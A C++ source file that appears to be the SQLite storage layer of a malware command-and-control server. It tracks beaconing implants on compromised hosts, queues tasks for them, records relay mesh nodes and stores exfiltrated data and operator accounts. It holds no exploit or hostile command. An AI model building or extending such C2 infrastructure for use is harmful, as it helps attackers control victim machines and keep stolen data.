#include "snake/store.hpp"

#include <sqlite3.h>

#include <chrono>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

namespace snake::store {

namespace {

int64_t now_ns() {
    return std::chrono::duration_cast<std::chrono::nanoseconds>(
               std::chrono::system_clock::now().time_since_epoch())
        .count();
}

void civil_from_days(int64_t z, int* y, unsigned* m, unsigned* d) {
    z += 719468;
    const int64_t era = (z >= 0 ? z : z - 146096) / 146097;
    const unsigned doe = static_cast<unsigned>(z - era * 146097);
    const unsigned yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    const int64_t yy = static_cast<int64_t>(yoe) + era * 400;
    const unsigned doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    const unsigned mp = (5 * doy + 2) / 153;
    const unsigned dd = doy - (153 * mp + 2) / 5 + 1;
    const unsigned mm = mp < 10 ? mp + 3 : mp - 9;
    *y = static_cast<int>(yy + (mm <= 2));
    *m = mm;
    *d = dd;
}

int64_t days_from_civil(int y, unsigned m, unsigned d) {
    y -= m <= 2;
    const int64_t era = (y >= 0 ? y : y - 399) / 400;
    const unsigned yoe = static_cast<unsigned>(y - era * 400);
    const unsigned doy = (153 * (m > 2 ? m - 3 : m + 9) + 2) / 5 + d - 1;
    const unsigned doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    return era * 146097 + static_cast<int64_t>(doe) - 719468;
}

std::string errmsg(sqlite3* db) {
    const char* m = db ? sqlite3_errmsg(db) : nullptr;
    return m ? std::string(m) : std::string("unknown error");
}

void set_err(std::string* err, const std::string& msg) {
    if (err) *err = msg;
}

bool fail(std::string* err, sqlite3* db, const std::string& prefix) {
    set_err(err, prefix + ": " + errmsg(db));
    return false;
}

int step_done(sqlite3_stmt* st, sqlite3* db, std::string* err) {
    int rc = sqlite3_step(st);
    if (rc == SQLITE_ROW || rc == SQLITE_DONE) return rc;
    set_err(err, errmsg(db));
    return -1;
}

std::string text_col(sqlite3_stmt* st, int i) {
    const unsigned char* p = sqlite3_column_text(st, i);
    if (p == nullptr) return std::string();
    return std::string(reinterpret_cast<const char*>(p),
                       static_cast<size_t>(sqlite3_column_bytes(st, i)));
}

int64_t time_col(sqlite3_stmt* st, int i) {
    const unsigned char* p = sqlite3_column_text(st, i);
    if (p == nullptr) return 0;
    if (sqlite3_column_type(st, i) == SQLITE_INTEGER) {
        return sqlite3_column_int64(st, i) * 1000000000LL;
    }
    auto v = parse_sqlite_time(std::string(reinterpret_cast<const char*>(p),
                                           static_cast<size_t>(sqlite3_column_bytes(st, i))));
    return v.value_or(0);
}

bool bind_text(sqlite3_stmt* st, int i, const std::string& s) {
    return sqlite3_bind_text(st, i, s.c_str(), static_cast<int>(s.size()), SQLITE_TRANSIENT) ==
           SQLITE_OK;
}

void exec_or_ignore(sqlite3* db, const char* sql) {
    char* e = nullptr;
    sqlite3_exec(db, sql, nullptr, nullptr, &e);
    if (e) sqlite3_free(e);
}

const char* kImplantCols =
    "id, impl_type, target_proc, hostname, arch, first_seen, last_seen, beacon_count, "
    "tasks_sent, tasks_done, jitter_score, dns_enabled, mesh_enabled, flagged, node_id";

ImplantRecord scan_implant(sqlite3_stmt* st) {
    ImplantRecord r;
    r.id = text_col(st, 0);
    r.impl_type = text_col(st, 1);
    r.target_proc = text_col(st, 2);
    r.hostname = text_col(st, 3);
    r.arch = text_col(st, 4);
    r.first_seen_ns = time_col(st, 5);
    r.last_seen_ns = time_col(st, 6);
    r.beacon_count = sqlite3_column_int(st, 7);
    r.tasks_sent = sqlite3_column_int(st, 8);
    r.tasks_done = sqlite3_column_int(st, 9);
    r.jitter_score = sqlite3_column_double(st, 10);
    r.dns_enabled = sqlite3_column_int(st, 11) == 1;
    r.mesh_enabled = sqlite3_column_int(st, 12) == 1;
    r.flagged = sqlite3_column_int(st, 13) == 1;
    r.node_id = text_col(st, 14);
    return r;
}

}  // namespace

std::string format_sqlite_time(int64_t unix_nanos) {
    int64_t secs = unix_nanos / 1000000000LL;
    int64_t frac = unix_nanos % 1000000000LL;
    if (frac < 0) {
        frac += 1000000000LL;
        secs -= 1;
    }
    int64_t days = secs / 86400;
    int64_t rem = secs % 86400;
    if (rem < 0) {
        rem += 86400;
        days -= 1;
    }
    int y = 0;
    unsigned mo = 0, d = 0;
    civil_from_days(days, &y, &mo, &d);
    int hh = static_cast<int>(rem / 3600);
    int mi = static_cast<int>((rem % 3600) / 60);
    int ss = static_cast<int>(rem % 60);

    char buf[64];
    if (frac == 0) {
        std::snprintf(buf, sizeof(buf), "%04d-%02u-%02u %02d:%02d:%02d+00:00", y, mo, d, hh, mi,
                      ss);
        return buf;
    }
    char fracbuf[16];
    std::snprintf(fracbuf, sizeof(fracbuf), "%09lld", static_cast<long long>(frac));
    int len = 9;
    while (len > 0 && fracbuf[len - 1] == '0') len--;
    fracbuf[len] = '\0';
    std::snprintf(buf, sizeof(buf), "%04d-%02u-%02u %02d:%02d:%02d.%s+00:00", y, mo, d, hh, mi, ss,
                  fracbuf);
    return buf;
}

std::optional<int64_t> parse_sqlite_time(const std::string& s) {
    size_t i = 0;
    auto digits = [&](int n, int* out) -> bool {
        if (i + static_cast<size_t>(n) > s.size()) return false;
        int v = 0;
        for (int k = 0; k < n; k++) {
            char c = s[i + static_cast<size_t>(k)];
            if (c < '0' || c > '9') return false;
            v = v * 10 + (c - '0');
        }
        i += static_cast<size_t>(n);
        *out = v;
        return true;
    };

    int y = 0, mo = 0, d = 0;
    if (!digits(4, &y)) return std::nullopt;
    if (i >= s.size() || s[i] != '-') return std::nullopt;
    i++;
    if (!digits(2, &mo)) return std::nullopt;
    if (i >= s.size() || s[i] != '-') return std::nullopt;
    i++;
    if (!digits(2, &d)) return std::nullopt;

    int hh = 0, mi = 0, ss = 0;
    int64_t frac = 0;
    if (i < s.size() && (s[i] == ' ' || s[i] == 'T')) {
        i++;
        if (!digits(2, &hh)) return std::nullopt;
        if (i < s.size() && s[i] == ':') {
            i++;
            if (!digits(2, &mi)) return std::nullopt;
            if (i < s.size() && s[i] == ':') {
                i++;
                if (!digits(2, &ss)) return std::nullopt;
                if (i < s.size() && s[i] == '.') {
                    i++;
                    int n = 0;
                    int64_t scale = 100000000LL;
                    while (i < s.size() && s[i] >= '0' && s[i] <= '9') {
                        if (n < 9) {
                            frac += static_cast<int64_t>(s[i] - '0') * scale;
                            scale /= 10;
                        }
                        i++;
                        n++;
                    }
                }
            }
        }
    }

    int64_t offset = 0;
    if (i < s.size()) {
        char c = s[i];
        if (c == 'Z' || c == 'z') {
            i++;
        } else if (c == '+' || c == '-') {
            int sign = (c == '-') ? -1 : 1;
            i++;
            int zh = 0, zm = 0;
            if (!digits(2, &zh)) return std::nullopt;
            if (i < s.size() && s[i] == ':') {
                i++;
                if (!digits(2, &zm)) return std::nullopt;
            }
            offset = sign * (zh * 3600 + zm * 60);
        }
    }
    if (i != s.size()) return std::nullopt;

    int64_t days = days_from_civil(y, static_cast<unsigned>(mo), static_cast<unsigned>(d));
    int64_t secs = days * 86400 + hh * 3600 + mi * 60 + ss - offset;
    return secs * 1000000000LL + frac;
}

std::string task_to_json(const Task& t) {
    nlohmann::json j = nlohmann::json::object();
    j["id"] = t.id;
    j["type"] = t.type;
    j["payload"] = t.payload;
    j["ts"] = t.ts;
    if (t.ttl.has_value() && *t.ttl != 0) j["ttl"] = *t.ttl;
    return j.dump();
}

Store::~Store() { close(); }

void Store::close() {
    std::lock_guard<std::mutex> lk(mu_);
    if (db_) {
        sqlite3_close(db_);
        db_ = nullptr;
    }
}

bool Store::open(const std::string& path, std::string* err) {
    std::lock_guard<std::mutex> lk(mu_);
    sqlite3* db = nullptr;
    if (sqlite3_open(path.c_str(), &db) != SQLITE_OK) {
        std::string m = errmsg(db);
        if (db) sqlite3_close(db);
        set_err(err, "open db: " + m);
        return false;
    }
    db_ = db;
    sqlite3_busy_timeout(db_, 5000);
    exec_or_ignore(db_, "PRAGMA journal_mode=WAL;");
    if (!migrate_locked(err)) return false;
    return true;
}

bool Store::migrate_locked(std::string* err) {
    static const char* kStatements[] = {
        R"(CREATE TABLE IF NOT EXISTS implants (
			id TEXT PRIMARY KEY,
			impl_type TEXT NOT NULL DEFAULT 'windows',
			target_proc TEXT,
			hostname TEXT,
			arch TEXT,
			first_seen DATETIME NOT NULL,
			last_seen DATETIME NOT NULL,
			beacon_count INTEGER DEFAULT 0,
			tasks_sent INTEGER DEFAULT 0,
			tasks_done INTEGER DEFAULT 0,
			jitter_score REAL DEFAULT 1.0,
			dns_enabled INTEGER DEFAULT 0,
			mesh_enabled INTEGER DEFAULT 0,
			flagged INTEGER DEFAULT 0,
			node_id TEXT,
			metadata TEXT
		))",
        R"(CREATE TABLE IF NOT EXISTS tasks (
			id TEXT PRIMARY KEY,
			implant_id TEXT NOT NULL,
			task_type TEXT NOT NULL,
			payload TEXT,
			created_at DATETIME NOT NULL,
			executed_at DATETIME,
			result TEXT,
			status TEXT DEFAULT 'pending',
			channel TEXT DEFAULT 'primary',
			FOREIGN KEY(implant_id) REFERENCES implants(id)
		))",
        R"(CREATE TABLE IF NOT EXISTS mesh_nodes (
			id TEXT PRIMARY KEY,
			addr TEXT NOT NULL,
			pubkey BLOB,
			last_seen DATETIME NOT NULL,
			implant_count INTEGER DEFAULT 0,
			version TEXT
		))",
        R"(CREATE TABLE IF NOT EXISTS exfil_data (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			implant_id TEXT NOT NULL,
			data_type TEXT,
			data BLOB,
			channel TEXT DEFAULT 'primary',
			received_at DATETIME NOT NULL,
			FOREIGN KEY(implant_id) REFERENCES implants(id)
		))",
        R"(CREATE TABLE IF NOT EXISTS operators (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			username TEXT UNIQUE NOT NULL,
			password_hash TEXT NOT NULL,
			role TEXT DEFAULT 'operator',
			created_at DATETIME NOT NULL
		))",
    };

    exec_or_ignore(db_, "BEGIN");
    for (const char* sql : kStatements) {
        char* e = nullptr;
        if (sqlite3_exec(db_, sql, nullptr, nullptr, &e) != SQLITE_OK) {
            std::string m = e ? e : errmsg(db_);
            if (e) sqlite3_free(e);
            exec_or_ignore(db_, "ROLLBACK");
            char head[61];
            std::snprintf(head, sizeof(head), "%.60s", sql);
            set_err(err, std::string("migrate: stmt \"") + head + "\": " + m);
            return false;
        }
    }
    if (sqlite3_exec(db_, "COMMIT", nullptr, nullptr, nullptr) != SQLITE_OK) {
        set_err(err, std::string("migrate: ") + errmsg(db_));
        return false;
    }
    return true;
}

bool Store::upsert_implant(const ImplantRecord& ir, std::string* err) {
    std::lock_guard<std::mutex> lk(mu_);
    if (!db_) return fail(err, nullptr, "db closed");
    const char* sql =
        "INSERT INTO implants (id, impl_type, target_proc, hostname, arch, first_seen, last_seen, "
        "beacon_count, jitter_score, dns_enabled, mesh_enabled, flagged, node_id) "
        "VALUES (?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?, ?, ?) "
        "ON CONFLICT(id) DO UPDATE SET "
        "last_seen = excluded.last_seen, "
        "beacon_count = beacon_count + 1, "
        "target_proc = COALESCE(excluded.target_proc, target_proc), "
        "hostname = COALESCE(excluded.hostname, hostname), "
        "jitter_score = excluded.jitter_score, "
        "dns_enabled = excluded.dns_enabled, "
        "mesh_enabled = excluded.mesh_enabled, "
        "node_id = COALESCE(excluded.node_id, node_id)";
    sqlite3_stmt* st = nullptr;
    if (sqlite3_prepare_v2(db_, sql, -1, &st, nullptr) != SQLITE_OK)
        return fail(err, db_, "prepare");
    int64_t now = now_ns();
    std::string now_s = format_sqlite_time(now);
    bind_text(st, 1, ir.id);
    bind_text(st, 2, ir.impl_type);
    bind_text(st, 3, ir.target_proc);
    bind_text(st, 4, ir.hostname);
    bind_text(st, 5, ir.arch);
    bind_text(st, 6, now_s);
    bind_text(st, 7, now_s);
    sqlite3_bind_double(st, 8, ir.jitter_score);
    sqlite3_bind_int(st, 9, ir.dns_enabled ? 1 : 0);
    sqlite3_bind_int(st, 10, ir.mesh_enabled ? 1 : 0);
    sqlite3_bind_int(st, 11, ir.flagged ? 1 : 0);
    bind_text(st, 12, ir.node_id);
    int rc = sqlite3_step(st);
    sqlite3_finalize(st);
    if (rc != SQLITE_DONE) return fail(err, db_, "upsert implant");
    return true;
}

std::optional<ImplantRecord> Store::get_implant(const std::string& id, std::string* err) {
    std::lock_guard<std::mutex> lk(mu_);
    if (!db_) {
        fail(err, nullptr, "db closed");
        return std::nullopt;
    }
    std::string sql = std::string("SELECT ") + kImplantCols + " FROM implants WHERE id = ?";
    sqlite3_stmt* st = nullptr;
    if (sqlite3_prepare_v2(db_, sql.c_str(), -1, &st, nullptr) != SQLITE_OK) {
        fail(err, db_, "prepare");
        return std::nullopt;
    }
    bind_text(st, 1, id);
    int rc = step_done(st, db_, err);
    if (rc == -1) {
        sqlite3_finalize(st);
        return std::nullopt;
    }
    if (rc == SQLITE_DONE) {
        sqlite3_finalize(st);
        set_err(err, "sql: no rows in result set");
        return std::nullopt;
    }
    ImplantRecord r = scan_implant(st);
    sqlite3_finalize(st);
    return r;
}

std::vector<ImplantRecord> Store::list_implants(std::string* err) {
    std::lock_guard<std::mutex> lk(mu_);
    std::vector<ImplantRecord> out;
    if (!db_) {
        fail(err, nullptr, "db closed");
        return out;
    }
    std::string sql = std::string("SELECT ") + kImplantCols + " FROM implants ORDER BY last_seen DESC";
    sqlite3_stmt* st = nullptr;
    if (sqlite3_prepare_v2(db_, sql.c_str(), -1, &st, nullptr) != SQLITE_OK) {
        fail(err, db_, "prepare");
        return out;
    }
    while (true) {
        int rc = step_done(st, db_, err);
        if (rc == -1) break;
        if (rc == SQLITE_DONE) break;
        out.push_back(scan_implant(st));
    }
    sqlite3_finalize(st);
    return out;
}

int Store::implant_count(std::string* err) {
    std::lock_guard<std::mutex> lk(mu_);
    int n = 0;
    if (!db_) {
        fail(err, nullptr, "db closed");
        return 0;
    }
    sqlite3_stmt* st = nullptr;
    if (sqlite3_prepare_v2(db_, "SELECT COUNT(*) FROM implants", -1, &st, nullptr) != SQLITE_OK) {
        fail(err, db_, "prepare");
        return 0;
    }
    if (step_done(st, db_, err) == SQLITE_ROW) n = sqlite3_column_int(st, 0);
    sqlite3_finalize(st);
    return n;
}

std::optional<Task> Store::create_task(const std::string& implant_id, const std::string& type,
                                       const std::string& channel, const nlohmann::json& payload,
                                       std::string* err) {
    std::lock_guard<std::mutex> lk(mu_);
    if (!db_) {
        fail(err, nullptr, "db closed");
        return std::nullopt;
    }
    int64_t created = now_ns();
    Task t;
    t.id = "T" + std::to_string(created);
    t.type = type;
    t.payload = payload;
    t.ts = created / 1000000000LL;
    t.ttl = 3600;
    t.channel = channel;

    sqlite3_stmt* st = nullptr;
    if (sqlite3_prepare_v2(db_,
                           "INSERT INTO tasks (id, implant_id, task_type, payload, created_at, "
                           "status, channel) VALUES (?, ?, ?, ?, ?, 'pending', ?)",
                           -1, &st, nullptr) != SQLITE_OK) {
        fail(err, db_, "prepare");
        return std::nullopt;
    }
    bind_text(st, 1, t.id);
    bind_text(st, 2, implant_id);
    bind_text(st, 3, type);
    bind_text(st, 4, payload.dump());
    bind_text(st, 5, format_sqlite_time(created));
    bind_text(st, 6, channel);
    int rc = sqlite3_step(st);
    sqlite3_finalize(st);
    if (rc != SQLITE_DONE) {
        fail(err, db_, "insert task");
        return std::nullopt;
    }
    exec_or_ignore(db_, "BEGIN");
    sqlite3_stmt* up = nullptr;
    if (sqlite3_prepare_v2(db_, "UPDATE implants SET tasks_sent = tasks_sent + 1 WHERE id = ?", -1,
                           &up, nullptr) == SQLITE_OK) {
        bind_text(up, 1, implant_id);
        sqlite3_step(up);
        sqlite3_finalize(up);
    }
    exec_or_ignore(db_, "COMMIT");
    return t;
}

std::vector<Task> Store::pending_tasks(const std::string& implant_id, std::string* err) {
    std::lock_guard<std::mutex> lk(mu_);
    std::vector<Task> out;
    if (!db_) {
        fail(err, nullptr, "db closed");
        return out;
    }
    sqlite3_stmt* st = nullptr;
    if (sqlite3_prepare_v2(db_,
                           "SELECT id, task_type, payload, created_at, channel FROM tasks WHERE "
                           "implant_id = ? AND status = 'pending'",
                           -1, &st, nullptr) != SQLITE_OK) {
        fail(err, db_, "prepare");
        return out;
    }
    bind_text(st, 1, implant_id);
    bool failed = false;
    while (true) {
        int rc = step_done(st, db_, err);
        if (rc == -1) {
            failed = true;
            break;
        }
        if (rc == SQLITE_DONE) break;
        Task t;
        t.id = text_col(st, 0);
        t.type = text_col(st, 1);
        std::string payloadStr = text_col(st, 2);
        t.created_at_ns = time_col(st, 3);
        t.ts = t.created_at_ns / 1000000000LL;
        t.channel = text_col(st, 4);
        auto pj = nlohmann::json::parse(payloadStr, nullptr, false);
        t.payload = pj.is_discarded() ? nlohmann::json(nullptr) : pj;
        out.push_back(t);
    }
    sqlite3_finalize(st);
    if (failed) return {};

    for (const auto& t : out) {
        sqlite3_stmt* up = nullptr;
        if (sqlite3_prepare_v2(db_, "UPDATE tasks SET status = 'delivered' WHERE id = ?", -1, &up,
                               nullptr) == SQLITE_OK) {
            bind_text(up, 1, t.id);
            sqlite3_step(up);
            sqlite3_finalize(up);
        }
    }
    return out;
}

bool Store::complete_task(const std::string& task_id, const protocol::TaskResult& result,
                          std::string* err) {
    std::lock_guard<std::mutex> lk(mu_);
    if (!db_) return fail(err, nullptr, "db closed");
    std::string resultJSON = protocol::to_json(result);
    sqlite3_stmt* st = nullptr;
    if (sqlite3_prepare_v2(db_,
                           "UPDATE tasks SET status = 'completed', result = ?, executed_at = ? "
                           "WHERE id = ?",
                           -1, &st, nullptr) != SQLITE_OK)
        return fail(err, db_, "prepare");
    bind_text(st, 1, resultJSON);
    bind_text(st, 2, format_sqlite_time(now_ns()));
    bind_text(st, 3, task_id);
    int rc = sqlite3_step(st);
    sqlite3_finalize(st);
    if (rc != SQLITE_DONE) return fail(err, db_, "complete task");

    sqlite3_stmt* up = nullptr;
    if (sqlite3_prepare_v2(db_,
                           "UPDATE implants SET tasks_done = tasks_done + 1 WHERE id = (SELECT "
                           "implant_id FROM tasks WHERE id = ?)",
                           -1, &up, nullptr) == SQLITE_OK) {
        bind_text(up, 1, task_id);
        sqlite3_step(up);
        sqlite3_finalize(up);
    }
    return true;
}

bool Store::exfil_data(const std::string& implant_id, const std::string& data_type,
                       const std::string& channel, const std::string& data, std::string* err) {
    std::lock_guard<std::mutex> lk(mu_);
    if (!db_) return fail(err, nullptr, "db closed");
    sqlite3_stmt* st = nullptr;
    if (sqlite3_prepare_v2(db_,
                           "INSERT INTO exfil_data (implant_id, data_type, data, channel, "
                           "received_at) VALUES (?, ?, ?, ?, ?)",
                           -1, &st, nullptr) != SQLITE_OK)
        return fail(err, db_, "prepare");
    bind_text(st, 1, implant_id);
    bind_text(st, 2, data_type);
    sqlite3_bind_blob(st, 3, data.data(), static_cast<int>(data.size()), SQLITE_TRANSIENT);
    bind_text(st, 4, channel);
    bind_text(st, 5, format_sqlite_time(now_ns()));
    int rc = sqlite3_step(st);
    sqlite3_finalize(st);
    if (rc != SQLITE_DONE) return fail(err, db_, "insert exfil");
    return true;
}

bool Store::upsert_mesh_node(const MeshNode& node, std::string* err) {
    std::lock_guard<std::mutex> lk(mu_);
    if (!db_) return fail(err, nullptr, "db closed");
    const char* sql =
        "INSERT INTO mesh_nodes (id, addr, pubkey, last_seen, implant_count, version) "
        "VALUES (?, ?, ?, ?, ?, ?) "
        "ON CONFLICT(id) DO UPDATE SET "
        "addr = excluded.addr, "
        "last_seen = excluded.last_seen, "
        "implant_count = excluded.implant_count, "
        "version = excluded.version";
    sqlite3_stmt* st = nullptr;
    if (sqlite3_prepare_v2(db_, sql, -1, &st, nullptr) != SQLITE_OK)
        return fail(err, db_, "prepare");
    bind_text(st, 1, node.id);
    bind_text(st, 2, node.addr);
    if (node.pubkey.empty()) {
        sqlite3_bind_null(st, 3);
    } else {
        sqlite3_bind_blob(st, 3, node.pubkey.data(), static_cast<int>(node.pubkey.size()),
                          SQLITE_TRANSIENT);
    }
    bind_text(st, 4, format_sqlite_time(now_ns()));
    sqlite3_bind_int(st, 5, node.implants);
    bind_text(st, 6, node.version);
    int rc = sqlite3_step(st);
    sqlite3_finalize(st);
    if (rc != SQLITE_DONE) return fail(err, db_, "upsert mesh node");
    return true;
}

std::vector<MeshNode> Store::list_mesh_nodes(std::string* err) {
    std::lock_guard<std::mutex> lk(mu_);
    std::vector<MeshNode> out;
    if (!db_) {
        fail(err, nullptr, "db closed");
        return out;
    }
    sqlite3_stmt* st = nullptr;
    if (sqlite3_prepare_v2(db_,
                           "SELECT id, addr, last_seen, implant_count, version FROM mesh_nodes "
                           "ORDER BY last_seen DESC",
                           -1, &st, nullptr) != SQLITE_OK) {
        fail(err, db_, "prepare");
        return out;
    }
    while (true) {
        int rc = step_done(st, db_, err);
        if (rc == -1) break;
        if (rc == SQLITE_DONE) break;
        MeshNode n;
        n.id = text_col(st, 0);
        n.addr = text_col(st, 1);
        n.last_seen_ns = time_col(st, 2);
        n.implants = sqlite3_column_int(st, 3);
        n.version = text_col(st, 4);
        out.push_back(n);
    }
    sqlite3_finalize(st);
    return out;
}

bool Store::query_raw(const std::string& sql, std::vector<std::vector<std::string>>* rows,
                      std::string* err) {
    std::lock_guard<std::mutex> lk(mu_);
    if (!db_) return fail(err, nullptr, "db closed");
    rows->clear();
    sqlite3_stmt* st = nullptr;
    if (sqlite3_prepare_v2(db_, sql.c_str(), -1, &st, nullptr) != SQLITE_OK)
        return fail(err, db_, "prepare");
    int ncols = sqlite3_column_count(st);
    while (true) {
        int rc = step_done(st, db_, err);
        if (rc == -1) {
            sqlite3_finalize(st);
            return false;
        }
        if (rc == SQLITE_DONE) break;
        std::vector<std::string> row;
        for (int i = 0; i < ncols; i++) {
            if (sqlite3_column_type(st, i) == SQLITE_NULL) {
                row.push_back("NULL");
            } else if (sqlite3_column_type(st, i) == SQLITE_BLOB) {
                row.push_back(std::string(static_cast<const char*>(sqlite3_column_blob(st, i)),
                                          static_cast<size_t>(sqlite3_column_bytes(st, i))));
            } else {
                row.push_back(text_col(st, i));
            }
        }
        rows->push_back(std::move(row));
    }
    sqlite3_finalize(st);
    return true;
}

}  // namespace snake::store
